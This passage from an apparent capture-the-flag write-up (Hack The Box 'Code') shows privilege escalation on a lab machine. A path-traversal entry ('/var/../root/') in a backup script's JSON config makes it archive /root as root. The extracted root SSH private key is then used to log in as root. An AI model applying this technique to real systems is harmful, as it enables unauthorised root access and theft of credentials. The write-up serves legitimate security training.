+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;destination&quot;</span>: <span class="string">&quot;/tmp/test/test&quot;</span>,</span><br><span class="line">  <span class="string">&quot;multiprocessing&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;verbose_log&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="string">&quot;directories_to_archive&quot;</span>: [</span><br><span class="line">    <span class="string">&quot;/var/../root/&quot;</span></span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">martin@code:/tmp/test/test$ <span class="built_in">sudo</span> /usr/bin/backy.sh exp.json</span><br><span class="line">2025/03/24 06:41:13 🍀 backy 1.2</span><br><span class="line">2025/03/24 06:41:13 📋 Working with exp.json ...</span><br><span class="line">2025/03/24 06:41:13 💤 Nothing to <span class="built_in">sync</span></span><br><span class="line">2025/03/24 06:41:13 📤 Archiving: [/var/../root]</span><br><span class="line">2025/03/24 06:41:13 📥 To: /tmp/test/test ...</span><br><span class="line">2025/03/24 06:41:13 📦</span><br><span class="line">tar: Removing leading `/var/../<span class="string">&#x27; from member names</span></span><br><span class="line"><span class="string">/var/../root/</span></span><br><span class="line"><span class="string">/var/../root/.local/</span></span><br><span class="line"><span class="string">/var/../root/.local/share/</span></span><br><span class="line"><span class="string">/var/../root/.local/share/nano/</span></span><br><span class="line"><span class="string">/var/../root/.local/share/nano/search_history</span></span><br><span class="line"><span class="string">/var/../root/.sqlite_history</span></span><br><span class="line"><span class="string">/var/../root/.profile</span></span><br><span class="line"><span class="string">/var/../root/scripts/</span></span><br><span class="line"><span class="string">/var/../root/scripts/cleanup.sh</span></span><br><span class="line"><span class="string">/var/../root/scripts/backups/</span></span><br><span class="line"><span class="string">/var/../root/scripts/backups/task.json</span></span><br><span class="line"><span class="string">/var/../root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2</span></span><br><span class="line"><span class="string">/var/../root/scripts/database.db</span></span><br><span class="line"><span class="string">/var/../root/scripts/cleanup2.sh</span></span><br><span class="line"><span class="string">/var/../root/.python_history</span></span><br><span class="line"><span class="string">/var/../root/root.txt</span></span><br><span class="line"><span class="string">/var/../root/.cache/</span></span><br><span class="line"><span class="string">/var/../root/.cache/motd.legal-displayed</span></span><br><span class="line"><span class="string">/var/../root/.ssh/</span></span><br><span class="line"><span class="string">/var/../root/.ssh/id_rsa</span></span><br><span class="line"><span class="string">/var/../root/.ssh/authorized_keys</span></span><br><span class="line"><span class="string">/var/../root/.bash_history</span></span><br><span class="line"><span class="string">/var/../root/.bashrc</span></span><br></pre></td></tr></table></figure></div>
+
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">martin@code:/tmp/test/test$ tar -xvjf code_var_.._root_2025_March.tar.bz2</span><br><span class="line">root/</span><br><span class="line">root/.local/</span><br><span class="line">root/.local/share/</span><br><span class="line">root/.local/share/nano/</span><br><span class="line">root/.local/share/nano/search_history</span><br><span class="line">root/.sqlite_history</span><br><span class="line">root/.profile</span><br><span class="line">root/scripts/</span><br><span class="line">root/scripts/cleanup.sh</span><br><span class="line">root/scripts/backups/</span><br><span class="line">root/scripts/backups/task.json</span><br><span class="line">root/scripts/backups/code_home_app-production_app_2024_August.tar.bz2</span><br><span class="line">root/scripts/database.db</span><br><span class="line">root/scripts/cleanup2.sh</span><br><span class="line">root/.python_history</span><br><span class="line">root/root.txt</span><br><span class="line">root/.cache/</span><br><span class="line">root/.cache/motd.legal-displayed</span><br><span class="line">root/.ssh/</span><br><span class="line">root/.ssh/id_rsa</span><br><span class="line">root/.ssh/authorized_keys</span><br><span class="line">root/.bash_history</span><br><span class="line">root/.bashrc</span><br></pre></td></tr></table></figure></div>
+
+<p>using the id_rsa from the .ssh directory in root directory</p>
+<div class="code-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">martin@code:/tmp/test/test/root/.ssh$ ssh root@localhost -i id_rsa</span><br><span class="line"></span><br><span class="line">root@code:~# <span class="built_in">whoami</span></span><br><span class="line">root</span><br></pre></td></tr></table></figure></div>
+
+		</div>
+
+		
+
+		
+		<ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/HTB/">#HTB</a>&nbsp;
+			</li>
+			
+			<li class="tag-item mx-0.5">
+				<a href="/tags/Linux/">#Linux</a>&nbsp;
+			</li>
+			
+		</ul>
+		
+
+		
+
+		
+		<div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+			
+			<div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="prev" rel="prev" href="/2025/04/08/Hackthebox/htb-whiterabbit/">
+					<span class="left arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-left"></i>
+					</span>
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-WhiteRabbit</span>
+						<span class="post-nav-item">Prev posts</span>
+					</span>
+				</a>
+			</div>
+			
+			
+			<div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+				<a class="next" rel="next" href="/2025/03/18/Hackthebox/htb-thefrizz/">
+					<span class="title flex justify-center items-center">
+						<span class="post-nav-title-item truncate max-w-48">HTB-TheFrizz</span>
+						<span class="post-nav-item">Next posts</span>
+					</span>
+					<span class="right arrow-icon flex justify-center items-center">
+						<i class="fa-solid fa-chevron-right"></i>
+					</span>
+				</a>
+			</div>
+			
+		</div>
+		
+
+
+		
+	</div>
+
+	
+	<div class="toc-content-container">
+		<div class="post-toc-wrap">
+	<div class="post-toc">
+		<div class="toc-title">On this page</div>
+		<div class="page-title">HTB-Code</div>
+		<ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#User"><span class="nav-text">User</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Priv-Esc"><span class="nav-text">Priv Esc</span></a></li></ol>
+
+	</div>
+</div>
+	</div>
+	
+</div>
+			</div>
+
+			
+		</div>
+
+		<div class="main-content-footer">
+			<footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2025</span>
+              -
+            
+            2025&nbsp;&nbsp;<i class="fa-regular fa-computer-classic"></i>&nbsp;&nbsp;<a href="/">Muyi</a>
+            
+                
+                <p class="post-count space-x-0.5">
+                    <span>
+                        37 posts in total
+                    </span>
+                    
+                </p>
+            
+        </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.8.5</a></span>
+        </div>
+        
+        
+        
+        
+        
+    </div>  
+</footer>
+		</div>
+	</div>
+
+	
+	<div class="post-tools">
+		<div class="post-tools-container">
+	<ul class="article-tools-list">
+		<!-- TOC aside toggle -->
+		
+		<li class="right-bottom-tools page-aside-toggle">
+			<i class="fa-regular fa-outdent"></i>
+		</li>
+		
+
+		<!-- go comment -->
+		
+	</ul>
+</div>
+	</div>
+	
+
+	<div class="right-side-tools-container">
+		<div class="side-tools-container">
+	<ul class="hidden-tools-list">
+		<li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-plus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+			<i class="fa-regular fa-magnifying-glass-minus"></i>
+		</li>
+
+		<li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+			<i class="fa-regular fa-moon"></i>
+		</li>
+
+		<!-- rss -->
+		
+
+		
+
+		<li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+			<i class="fa-regular fa-arrow-down"></i>
+		</li>
+	</ul>
+
+	<ul class="visible-tools-list">
+		<li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+			<i class="fa-regular fa-cog "></i>
+		</li>
+		
+		<li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+			<i class="arrow-up fas fa-arrow-up"></i>
+			<span class="percent"></span>
+		</li>
+		
+		
+	</ul>
+</div>
+	</div>
+
+	<div class="image-viewer-container">
+	<img src="">
+</div>
+
+	
+	<div class="search-pop-overlay">
+	<div class="popup search-popup">
+		<div class="search-header">
+			<span class="search-input-field-pre">
+				<i class="fa-solid fa-keyboard"></i>
+			</span>
+			<div class="search-input-container">
+				<input autocomplete="off" autocorrect="off" autocapitalize="off" placeholder="Search..." spellcheck="false" type="search" class="search-input">
+			</div>
+			<span class="popup-btn-close">
+				<i class="fa-solid fa-times"></i>
+			</span>
+		</div>
+		<div id="search-result">
+			<div id="no-result">
+				<i class="fa-solid fa-spinner fa-spin-pulse fa-5x fa-fw"></i>
+			</div>
+		</div>
+	</div>
+</div>
+	
+
+</main>
+
+
+
+<script src="/js/build/libs/Swup.min.js"></script>
+
+<script src="/js/build/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/build/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/build/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+	
+<script src="/js/build/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/build/utils.js" type="module"></script>
+
+<script src="/js/build/main.js" type="module"></script>
+
+<script src="/js/build/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/build/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/build/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/build/layouts/categoryList.js" type="module"></script>
+
+
+
+    
+<script src="/js/build/tools/localSearch.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/build/layouts/lazyload.js" type="module"></script>
+
+
+
+
+
+
+  
+<script src="/js/build/libs/Typed.min.js"></script>
+
+  
+<script src="/js/build/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+
+    
+<script src="/js/build/libs/anime.min.js"></script>
+
+
+
+
+
+    
+<script src="/js/build/tools/tocToggle.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/layouts/toc.js" type="module" data-swup-reload-script=""></script>
+
+<script src="/js/build/plugins/tabs.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+<script src="/js/build/libs/moment-with-locales.min.js" data-swup-reload-script=""></script>
+
+
+<script src="/js/build/layouts/essays.js" type="module" data-swup-reload-script=""></script>
+
+
+
+
+
+	
+</body>
+
+</html>
